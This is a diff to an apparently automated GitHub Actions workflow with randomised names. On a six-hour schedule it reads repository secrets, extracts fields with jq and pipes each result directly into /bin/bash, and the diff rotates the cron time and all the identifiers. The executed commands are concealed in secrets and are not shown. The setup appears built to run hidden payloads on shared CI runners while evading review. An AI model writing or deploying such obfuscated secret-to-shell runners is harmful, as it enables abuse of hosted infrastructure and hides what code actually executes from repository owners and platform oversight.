@@ -3,8 +3,9 @@ name: shentengyi6543
 on:
   workflow_dispatch:
   schedule:
-    - cron: '59 4/6 * * *'
-jobs:  # 29975
+    - cron: '38 3/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,15 +13,19 @@ jobs:  # 29975
       - uses: actions/checkout@v4
       - name: shentengyi6543
         env:
-          qai7008: ${{ secrets.qai7008 }}
+          n117: ${{ secrets.n117 }}
         run: |
-          echo $qai7008 | jq -r .zeddc0 | /bin/bash
-          echo $wkt022 | jq -r .ar839 | /bin/bash
-          echo $pihvu3009 | jq -r .aslus98508 | /bin/bash
-          echo $abk9 | jq -r .jhhhs6 | /bin/bash
-          echo $y992 | jq -r .ytfr5 | /bin/bash
-          echo $d0 | jq -r .rywvl33197 | /bin/bash
-          echo $ekj61 | jq -r .dy7610 | /bin/bash
-          echo $t90 | jq -r .xbpgs7237 | /bin/bash
-          echo $w62016 | jq -r .gzd580 | /bin/bash
+          echo $n117 | jq -r .zcbu412 | /bin/bash
+          echo $jxlo6252 | jq -r .vfb65391 | /bin/bash
+          echo $ktbt6959 | jq -r .tlij7428 | /bin/bash
+          echo $v57566 | jq -r .dh5921 | /bin/bash
+          echo $bvku5 | jq -r .i113 | /bin/bash
+          echo $gx53540 | jq -r .atuvv6 | /bin/bash
+          echo $s840 | jq -r .hujdb7745 | /bin/bash
+          echo $zqtg8 | jq -r .namb516 | /bin/bash
+          echo $ogxw471 | jq -r .eyled11 | /bin/bash
+          echo $oik185 | jq -r .ho7918 | /bin/bash
+          echo $ry5 | jq -r .q78 | /bin/bash
+          echo $vqzcg73 | jq -r .nchnq14893 | /bin/bash
+          echo $fl87136 | jq -r .cyskx207 | /bin/bash
 
